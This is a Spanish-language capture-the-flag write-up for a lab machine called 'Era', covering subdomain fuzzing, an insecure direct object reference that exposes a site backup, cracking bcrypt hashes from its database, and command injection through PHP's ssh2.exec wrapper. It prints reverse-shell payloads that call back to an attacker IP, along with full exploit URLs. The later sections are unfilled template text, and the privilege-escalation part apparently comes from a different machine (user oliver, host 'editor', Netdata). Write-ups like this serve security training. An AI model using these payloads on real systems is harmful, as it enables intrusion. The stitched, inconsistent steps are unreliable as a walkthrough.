
# Era

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Era`
* **IP:** `10.10.11.79`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```shellscript
sudo echo "10.10.11.79 era.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```shellscript
sudo nmap -v -sV -T5 10.10.11.79
```

```shellscript
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://era.htb` y observamos que parece ser una inmobiliaria online.

<figure><img src="/files/auBMtew0UpWckSRLyopA" alt=""><figcaption></figcaption></figure>

Es una landing page con anclas a cada sección, y solamente encontramos como posible vector de entrada el formulario:

<figure><img src="/files/xfdwNuhlmm3E6zhsLzS4" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Enumeración Web</mark>

### Testing de Formularios

* Probamos inyecciones SQL y XSS cómo:
  * `' OR '1'='1`
  * `<script>alert(1)</script>`

Pero no tenemos éxito.

### Fuzzing de Directorios

El fuzzing no arroja resultados interesantes, solamente tenemos acceso al index.html

```shellscript
gobuster dir -u http://era.htb -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://era.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 178] [--> http://era.htb/css/]
/fonts                (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
/img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
/index.html           (Status: 200) [Size: 19493]
/js                   (Status: 301) [Size: 178] [--> http://era.htb/js/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

```shellscript
ffuf -u http://era.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```shellscript
curl -s -I http://10.10.11.79 -H "Host: defnotvalid.era.htb" | grep "Content-Length:"

Content-Length: 154
```

#### Fuzzing con FFUF

```shellscript
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.79/ -H 'Host: FUZZ.era.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.79/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 34ms]
```

**Encontramos el subdominio:** `file.era.htb`

Lo añadimos a `/etc/hosts` y accedemos a través del navegador. Esta web aloja lo que parece un gestor de archivos, en el que podemos subir ficheros, lo que nos permitiría subir una reverse shell si está mal configurado:

<figure><img src="/files/CokAHc2zt6OR3QaZR78T" alt=""><figcaption></figcaption></figure>

Al darle a upload files nos pide loguearnos y no tenemos usuario y contraseña, por lo que tendremos que enumerar este subdominio:

<figure><img src="/files/uD6EwhjKCns4m4vX5MxX" alt=""><figcaption></figcaption></figure>

Haremos fuzzing para ver los directorios:

```shellscript
dirsearch -u http://file.era.htb -x 404,403                                                                                   

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/era/reports/http_file.era.htb/_25-09-26_01-46-19.txt

Target: http://file.era.htb/

[01:47:43] Starting: 
[01:48:05] 301 -  178B  - /assets  ->  http://file.era.htb/assets/
[01:48:13] 302 -    0B  - /download.php  ->  login.php
[01:48:15] 301 -  178B  - /files  ->  http://file.era.htb/files/
[01:48:18] 301 -  178B  - /images  ->  http://file.era.htb/images/
[01:48:21] 200 -   34KB - /LICENSE
[01:48:21] 200 -    9KB - /login.php
[01:48:22] 200 -   70B  - /logout.php
[01:48:22] 302 -    0B  - /manage.php  ->  login.php
[01:48:33] 200 -    3KB - /register.php
[01:48:41] 302 -    0B  - /upload.php  ->  login.php

Task Completed
```

Podemos ver que la página `register.php` es accesible, lo que nos permite crear una nueva cuenta de usuario. Después, podemos registrarla e iniciar sesión en la aplicación.

<figure><img src="/files/LIVkHYkNk7pasmv8LAqu" alt=""><figcaption></figcaption></figure>

En Upload files probaremos a subir una reverse shell:

<figure><img src="/files/I3uHZjl7ZxY35x1KwVNq" alt=""><figcaption></figcaption></figure>

Al subir la shell nos da la URL para acceder:

<figure><img src="/files/UhODeYJfzehgE1p6KVUU" alt=""><figcaption></figcaption></figure>

Pero al acceder a la URL solamente vemos que podemos descargar la shell que hemos subido, pero al probar otros IDs en la URL observamos que podemos acceder a otros archivos que hayan subido.

Usaremos los siguientes comandos para generar un listado de números de IDs y los fuzzearemos con ffuf para encontrar otros archivos:

```shellscript
# Genera un listado de números de 0 a 9999
seq -f "%04g" 0 9999 > numbers.txt

# Remplaza <replace cookie> con tu PHPSESSID cookie actual
ffuf -u http://file.era.htb/download.php\?id\=FUZZ -w numbers.txt -H "Cookie: PHPSESSID=<replace cookie>" -fs 7686
```

```shellscript
ffuf -u http://file.era.htb/download.php\?id\=FUZZ -w numbers.txt -H "Cookie: PHPSESSID=8umg4gfre1si9oofrjh9nje8ks" -fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/kali/Escritorio/machines/htb/era/found_files/numbers.txt
 :: Header           : Cookie: PHPSESSID=8umg4gfre1si9oofrjh9nje8ks
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

0054                    [Status: 200, Size: 6380, Words: 2552, Lines: 222, Duration: 39ms]
0150                    [Status: 200, Size: 6367, Words: 2552, Lines: 222, Duration: 146ms]
1141                    [Status: 200, Size: 6365, Words: 2552, Lines: 222, Duration: 38ms]
```

Encontramos 3 archivos interesantes, entre el que destacamos el `0054` que contiene un archivo `site-backup` interesante que nos descargaremos:

<figure><img src="/files/KlpUmoDTwzjZ2JuXAp70" alt=""><figcaption></figcaption></figure>

El ID `0150` contiene un archivo `signing.zip` que también nos descargaremos, y contiene un `key.pem` y `x509.genkey`:

```shellscript
afsh4ck@kali$ ls

key.pem  x509.genkey
```

En el zip de backup nos encontramos un archivo de base de datos `filedb.sqlite` que enumeraremos para encontrar usuarios o contraseñas:

```shellscript
afsh4ck@kali$ ls -la

drwxrwxr-x kali kali 4.0 KB Sat Sep 20 00:59:27 2025 .
drwxrwxr-x kali kali 4.0 KB Sat Sep 20 01:02:18 2025 ..
.rw-r--r-- kali kali  23 KB Mon Jun 30 00:29:47 2025 bg.jpg
drwxr-xr-x kali kali 4.0 KB Mon Jun 30 00:23:26 2025 css
.rw-r--r-- kali kali 2.5 KB Mon Jun 30 00:29:47 2025 download.php
.rw-r--r-- kali kali  20 KB Mon Jun 30 00:20:09 2025 filedb.sqlite
<----SNIP---->>
```

### Archivo de base de datos

Extraemos todo el contenido de la tabla users con los siguiente comandos:

```sql
afsh4ck@kali$ sqlite3 filedb.sqlite

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> .schema users
CREATE TABLE users (
                user_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_name varchar(255) NOT NULL,
                user_password varchar(255) NOT NULL,
                auto_delete_files_after int NOT NULL
                , security_answer1 varchar(255), security_answer2 varchar(255), security_answer3 varchar(255));
sqlite> SELECT * FROM users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```

Bingo! Conseguimos los hashes de los usuarios del equipo.

### Cracking de hashes

Nos guardamos los hashes en formato `user:hash` para crackearlos con John y ver la contraseña asociada a cada usuario:

```shellscript
cat > hashes_userhash.txt <<'EOF'
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
EOF
```

#### Cracking con John

```shellscript
john hashes_userhash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
america          (eric)     
mustang          (yuri) 
```

Encontramos 2 contraseñas asociadas a 2 usuarios, Eric y Yuri. No tenemos SSH en la máquina, pero tenemos FTP, por lo que probaremos estas credenciales.

### Acceso FTP

Probando las credenciales de Yuri conseguimos acceder por FTP y vemos 2 directorios interesantes:

```shellscript
ftp yuri@era.htb

Connected to era.htb.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||55420|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
```

Vamos a ver el contenido de los directorios:

```shellscript
ftp> ls apache2_conf
229 Entering Extended Passive Mode (|||8813|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1332 Dec 08  2024 000-default.conf
-rw-r--r--    1 0        0            7224 Dec 08  2024 apache2.conf
-rw-r--r--    1 0        0             222 Dec 13  2024 file.conf
-rw-r--r--    1 0        0             320 Dec 08  2024 ports.conf
226 Directory send OK.

ftp> ls php8.1_conf
229 Entering Extended Passive Mode (|||64323|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
```

Nos los descargaremos todo entrando a cada directorio y usando el siguiente comando:

```shellscript
ftp> mget *
```

### Análisis de los archivos

Podemos inspeccionar el código de los archivos usando `code-oss` desde Kali Linux:

```shellscript
sudo apt install code-oss
code-oss
```

En el directorio `php8.1conf` nos damos cuenta que tiene un archivo `ssh2.so` que pertenece/está relacionado con la extensión ssh2 para PHP con lo que podríamos realizar la conexión SSH con el código/sintaxis PHP.

Y ahora necesitamos encontrar una posición que podamos usar para explotar con la extensión SSH2.

Si nos volvemos a los archivos de backup y miramos el código de `download.php` vemos que hay una función BETA disponible solo para el admin:

<figure><img src="/files/t6yrAKhAIq8oihXeaJ2n" alt=""><figcaption></figcaption></figure>

Leemos el código y obtenemos que llama a una función `fopen` para leer el archivo cargado y devolverlo al usuario.

Tiene un punto especial aquí: recibe un parámetro `format` de la entrada del parámetro `GET` del usuario (como prefijo) y lo concatena con el nombre del archivo y luego lo pasa a la función `fopen`.

***

## <mark style="color:purple;">Explotación</mark>

Ahora viene la parte más jugosa: **explotar la inyección en el parámetro `format`** aprovechando que PHP tiene cargada la extensión **ssh2** (lo vimos en el `php8.1_conf/ssh2.so`).

Desde aquí, podemos realizar una inyección simple para realizar algunas comprobaciones como usar otro esquema o usar PHP Wrappers.

{% embed url="<https://www.php.net/manual/en/wrappers.ssh2.php>" %}

<figure><img src="/files/InvxZVv9DQ7mli0v2aMm" alt=""><figcaption></figcaption></figure>

Y es que la extensión `SSH2` que hemos descubierto anteriormente, podemos ver que soporta PHP stream wrapped y podemos usar `ssh2.exec` para hacer una conexión al servicio SSH local y ejecutar un reverse shell.

### Explotación con SSH2 Stream Wrapper

La presencia de `ssh2.so` nos permite usar el wrapper `ssh2.exec`.

{% hint style="warning" %}
**Importante**: El payload debe estar `URL encoded` para poder ejecutarlo, podemos usar Burp Decoder para ello.
{% endhint %}

#### **1. Abrir listener**

Usaremos [Penelope](https://github.com/brightio/penelope) en vez del típico Netcat ya que favorece la escalada de privilegios y el tratamiento automático de la TTY:

```shellscript
penelope -p 4444
```

#### 2. Payload de Penelope

Podemos usar un payload simple como:

```shellscript
echo 'bash -i >& /dev/tcp/10.10.14.66/4444 0>&1' | bash
```

O el payload de Penelope:

```shellscript
➤  tun0 → 10.10.14.66:4444

Bash TCP
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjYvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

#### 3. URL Codificar Payload&#x20;

Podemos usar CyberChef para ello, marcando la casilla de encode special chars:

<figure><img src="/files/9tM9fbmH1S3XXNkVaXYj" alt=""><figcaption></figcaption></figure>

```
printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjYvNDQ0NCAwPiYxKSAm%7Cbase64%20%2Dd%7Cbash
```

#### **2. Ejecutar payload final**

Prueba la siguiente carga útil para obtener una shell inversa. Dado que la URL está codificada en base64, evita incluir signos de suma (+), ya que se interpretarán como espacios. La solución consiste en insertar un signo de suma (+) para eliminar la codificación antes de la codificación base64.

```shellscript
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjYvNDQ0NCAwPiYxKSAm%7C|base64%20-d|bash%27;
```

{% code title="payload final de hyg" %}

```
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0ICAwPiYxKSAm|base64%20-d|bash%27;
```

{% endcode %}

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con Grafana 11.0.0 en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

**Exploit seleccionado:** *(Describir qué exploit se usó y su URL de referencia)*

### Ejecución del Exploit

Describir paso a paso cómo se logró la ejecución remota o el primer acceso.

***

## <mark style="color:purple;">Acceso Inicial</mark>

Una vez obtenido acceso:

* Verificar usuario actual (`whoami`)
* Verificar entorno (`uname -a`, `id`, `sudo -l`)

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
cat /home/<usuario>/user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Oliver:

```shell-session
oliver@editor:/tmp$ sudo -l                                                        
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

### Enumeración de archivos con permisos especiales

Buscando archivos con permisos especiales, encontré un archivo `ndsudo` sospechoso:

```shell-session
oliver@editor:/tmp$ find / -user root -perm -4000 -print 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

### Ver servicios internos corriendo

```shell-session
oliver@editor:/tmp$ ss -tuln

Netid State   Recv-Q  Send-Q        Local Address:Port    Peer Address:Port Process 
udp   UNCONN  0       0                 127.0.0.1:8125         0.0.0.0:*            
udp   UNCONN  0       0             127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       128                 0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN  0       4096          127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN  0       511                 0.0.0.0:80           0.0.0.0:*            
tcp   LISTEN  0       151               127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:19999        0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:8125         0.0.0.0:*            
tcp   LISTEN  0       4096              127.0.0.1:45249        0.0.0.0:*            
tcp   LISTEN  0       70                127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN  0       5                   0.0.0.0:8000         0.0.0.0:*            
tcp   LISTEN  0       128                    [::]:22              [::]:*            
tcp   LISTEN  0       511                    [::]:80              [::]:*            
tcp   LISTEN  0       50       [::ffff:127.0.0.1]:8079               *:*            
tcp   LISTEN  0       50                        *:8080               *:*   
```

Herramientas usadas:

* `sudo -l`
* `find / -perm -4000 2>/dev/null`
* `linpeas.sh`
* `pspy`

#### Técnica aplicada

Describir la técnica usada: binario con SUID, cronjob mal configurado, credenciales duras, etc.

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
cat /root/root.txt
```
